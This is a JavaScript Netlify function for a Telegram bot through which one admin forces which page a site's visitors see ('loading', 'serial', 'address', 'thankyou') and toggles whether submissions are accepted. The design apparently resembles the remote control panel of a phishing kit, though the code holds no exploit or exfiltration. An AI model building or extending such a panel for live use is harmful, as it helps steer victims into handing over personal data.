const { detaPutItem, BASE_APPSTATE } = require('./_deta_helpers');

const BOT_TOKEN = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID || process.env.TELEGRAM_CHAT_ID;

async function answerCallback(cbId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: cbId, text: text || '' })
    });
  } catch (e) { console.error('answerCallback failed', e); }
}

async function sendMessage(chatId, text, opts) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(Object.assign({ chat_id: chatId, text, parse_mode: 'HTML' }, opts || {}))
    });
  } catch (e) { console.error('sendMessage failed', e); }
}

exports.handler = async function handler(event) {
  // Netlify function receives raw body as string
  let update = {};
  try { update = event.body ? JSON.parse(event.body) : {}; } catch (e) { update = {}; }
  // respond fast
  const response = { statusCode: 200, body: JSON.stringify({ ok: true }) };

  (async function process(u) {
    try {
      if (!u) return;
      if (u.callback_query) {
        const cb = u.callback_query;
        const fromId = cb.from && cb.from.id;
        const data = (cb.data || '').trim();
        const allowedAdmin = String(fromId) === String(ADMIN_CHAT_ID);
        await answerCallback(cb.id);
        if (!allowedAdmin) { await sendMessage(cb.from.id, 'Unauthorized'); return; }
        const parts = data.split(' ');
        const cmd = parts[0];
        if (cmd === 'setpage') {
          const page = parts[1] || '';
          if (['page1','loading','serial','address','thankyou','none'].includes(page)) {
            const forced = page === 'none' ? null : page;
            await detaPutItem(BASE_APPSTATE, { key: 'config', forcedPage: forced });
            await sendMessage(ADMIN_CHAT_ID, `forcedPage set to ${forced}`);
            await answerCallback(cb.id, `forcedPage set to ${forced}`);
          } else {
            await sendMessage(ADMIN_CHAT_ID, 'Invalid page');
            await answerCallback(cb.id, 'Invalid page');
          }
        } else if (cmd === 'enable' || cmd === 'disable') {
          const allow = cmd === 'enable';
          await detaPutItem(BASE_APPSTATE, { key: 'config', acceptingSubmissions: allow });
          await sendMessage(ADMIN_CHAT_ID, `Submissions ${allow ? 'enabled' : 'disabled'}.`);
          await answerCallback(cb.id, `Submissions ${allow ? 'enabled' : 'disabled'}.`);
        } else {
          await sendMessage(ADMIN_CHAT_ID, 'Unknown action');
          await answerCallback(cb.id, 'Unknown action');
        }
        return;
      }

      const msg = u.message || u.channel_post;
      if (!msg) return;
      const chatId = msg.chat && msg.chat.id;
      const text = (msg.text || '').trim();
      const allowedAdmin = String(chatId) === String(ADMIN_CHAT_ID);
      if (!allowedAdmin) { await sendMessage(chatId, 'Unauthorized'); return; }
      if (text.startsWith('/controls')) {
        // send controls keyboard
        const keyboard = { inline_keyboard: [ [ { text: 'Status', callback_data: 'status' }, { text: 'Enable', callback_data: 'enable' }, { text: 'Disable', callback_data: 'disable' } ], [ { text: 'Page: page1', callback_data: 'setpage page1' }, { text: 'Page: loading', callback_data: 'setpage loading' }, { text: 'Page: serial', callback_data: 'setpage serial' } ], [ { text: 'Page: address', callback_data: 'setpage address' }, { text: 'Page: thankyou', callback_data: 'setpage thankyou' }, { text: 'Clear page', callback_data: 'setpage none' } ] ] };
        await sendMessage(chatId, 'Admin controls', { reply_markup: keyboard });
      } else if (text.startsWith('/setpage')) {
        const parts = text.split(' ');
        const page = parts[1] || '';
        if (['page1','loading','serial','address','thankyou','none'].includes(page)) {
          const forced = page === 'none' ? null : page;
          await detaPutItem(BASE_APPSTATE, { key: 'config', forcedPage: forced });
          await sendMessage(chatId, `forcedPage set to ${forced}`);
        } else {
          await sendMessage(chatId, 'Usage: /setpage <page1|loading|serial|address|thankyou|none>');
        }
      } else if (text.startsWith('/status')) {
        // fetch config
        const cfg = await (async () => { try { const r = await (await fetch(`https://database.deta.sh/v1/${process.env.DETA_PROJECT_ID}/appstate/items/config`, { headers: { Authorization: `Bearer ${process.env.DETA_PROJECT_KEY}` } })).json(); return (r && r.item) || {}; } catch { return {}; } })();
        await sendMessage(chatId, `<pre>${JSON.stringify(cfg, null, 2)}</pre>`);
      } else {
        await sendMessage(chatId, 'Unknown command');
      }
    } catch (e) {
      console.error('Error processing Telegram update', e);
    }
  })(update);

  return response;
};
